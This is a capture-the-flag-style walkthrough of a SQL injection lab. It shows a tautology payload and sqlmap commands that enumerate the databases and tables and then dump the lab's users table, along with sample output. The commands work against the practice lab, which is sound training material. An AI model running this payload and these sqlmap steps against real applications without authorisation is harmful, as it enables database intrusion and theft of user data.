
# 🛠️ SQL Injection Lab 0x03 Challenge Walkthrough [sqlmap]

---

## 🌐 Identifying SQL Injection Points

1. **Initial Testing**:  
   Confirm that SQL injection is possible.
   - Test with a simple payload:  
     ```
     x' or 1=1#
     ```
   - **Outcome:** If successful, it means the application is potentially vulnerable to SQL injections.

---

## 📊 Using `sqlmap` to Automate SQL Injection

### 1️⃣ **Database Focus**
Identify available databases:
```bash
sqlmap -r req-sqli3.txt --dbs
```

Example Output:
```
[23:58:45] [INFO] fetching database names
available databases [3]:
[*] bb-labs
[*] information_schema
[*] performance_schema
```

---

### 2️⃣ **Table Enumeration**
List all tables in a specific database (e.g., `bb-labs`):
```bash
sqlmap -r req-sqli3.txt -D bb-labs --tables
```

Example Output:
```
[23:58:11] [INFO] fetching tables for database: 'bb-labs'
Database: bb-labs
[14 tables]
+------------------------+
| api0x01                |
| auth0x02               |
| auth0x03               |
| c0x03                  |
| csrf0x01               |
| csrf0x02               |
| idor0x01               |
| injection0x01          |
| injection0x02          |
| injection0x03_products |
| injection0x03_users    |
| injection0x04          |
| xss0x02                |
| xss0x03                |
+------------------------+
```

---

### 3️⃣ **Dumping Data**
Target a specific table (e.g., `injection0x03_users`) to extract its contents:
```bash
sqlmap -r req-sqli3.txt -D bb-labs -T injection0x03_users --dump
```

---

## 🎯 Tips for Effective SQL Injection Testing

1. **Specify Both Database and Table:**  
   Always specify the database and table to ensure precise targeting and efficient testing.
2. **Use Saved Requests:**  
   Utilize `-r` to load HTTP requests from saved files, aiding in replicating precise attack scenarios.
3. **Monitor Output:**  
   Review logs and extracted data for anomalies or patterns that can guide further testing.

---

## 📝 Notes

- `sqlmap` fully automates the discovery and exploitation of SQL injection vulnerabilities.
- Always ensure you have permission to test and exploit vulnerabilities in any database or application.

---
